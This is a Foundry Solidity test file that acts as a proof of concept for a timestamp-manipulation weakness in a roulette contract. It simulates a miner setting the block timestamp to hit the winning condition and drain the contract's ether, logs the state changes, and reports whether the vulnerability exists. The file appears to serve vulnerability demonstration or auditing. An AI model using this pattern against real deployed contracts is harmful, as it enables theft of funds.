// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/roulette.sol";

contract RouletteTest is Test {
    Roulette public roulette;
    address owner = address(0x123);
    address player = address(0x456);
    address miner = address(0x789);

    function setUp() public {
        // Deploy contract with owner and initial balance
        vm.deal(owner, 1000 ether);
        vm.prank(owner);
        roulette = new Roulette{value: 100 ether}();
        
        // Fund test addresses
        vm.deal(player, 10 ether);
        vm.deal(miner, 10 ether);
    }

    function testMinerTimestampManipulation() public {
        // Player places normal bet (non-winning timestamp)
        vm.warp(100); // 100 % 15 = 10 ≠ 0
        vm.prank(player);
        roulette.placeBet{value: 10 ether}();
        
        // Get initial game state BEFORE miner manipulation
        console.log("--- BEFORE-Trigger Miner Attack ---");
        uint contractBalanceBefore = address(roulette).balance;
        uint minerBalanceBefore = miner.balance;
        uint totalWinnersBefore = roulette.totalWinners();
        uint minerWinsBefore = roulette.playerWins(miner);
        uint totalGamesBefore = roulette.totalGames();
        
        console.log("Contract Balance (before):", contractBalanceBefore);
        console.log("Miner Balance (before):", minerBalanceBefore);
        console.log("Total Winners (before):", totalWinnersBefore);
        console.log("Miner Wins Count (before):", minerWinsBefore);
        console.log("Total Games (before):", totalGamesBefore);
        
        // Miner manipulates next block timestamp to win
        console.log("--- Trigger Miner Attack (timestamp manipulation) ---");
        vm.roll(block.number + 1); // Advance to new block
        vm.warp(105); // 105 % 15 = 0 💫 winning condition
        
        vm.prank(miner);
        roulette.placeBet{value: 10 ether}();
        
        // Get final game state AFTER miner manipulation
        console.log("--- AFTER-Trigger Miner Attack ---");
        uint contactBalanceAfter = address(roulette).balance;
        uint minerBalanceAfter = miner.balance;
        uint totalWinnersAfter = roulette.totalWinners();
        uint minerWinsAfter = roulette.playerWins(miner);
        uint totalGamesAfter = roulette.totalGames();
        
        console.log("Contract Balance (after):", contactBalanceAfter);
        console.log("Miner Balance (after):", minerBalanceAfter);
        console.log("Total Winners (after):", totalWinnersAfter);
        console.log("Miner Wins Count (after):", minerWinsAfter);
        console.log("Total Games (after):", totalGamesAfter);
        
        // Calculate state differences
        console.log("--- State Changes ---");
        console.log("Contract Balance Change:", contractBalanceBefore - contactBalanceAfter);
        console.log("Miner Wins Count Change:", minerWinsAfter - minerWinsBefore);
        console.log("Total Winners Change:", totalWinnersAfter - totalWinnersBefore);
        console.log("Total Games Change:", totalGamesAfter - totalGamesBefore);
        
        // Verify vulnerability conditions
        bool minerWinsIncreased = (minerWinsAfter - minerWinsBefore) == 1;
        bool contractDrained = contactBalanceAfter == 0;
        bool totalWinnersIncreased = (totalWinnersAfter - totalWinnersBefore) == 1;
        bool totalGamesIncreased = (totalGamesAfter - totalGamesBefore) == 1;
        
        if(minerWinsIncreased && contractDrained && totalWinnersIncreased && totalGamesIncreased) {
            console.log("Vulnerability Exists: Miner successfully manipulated timestamp to trigger win and drain contract");
        } else {
            console.log("Vulnerability not Exist: State changes do not indicate successful attack");
        }
    }
}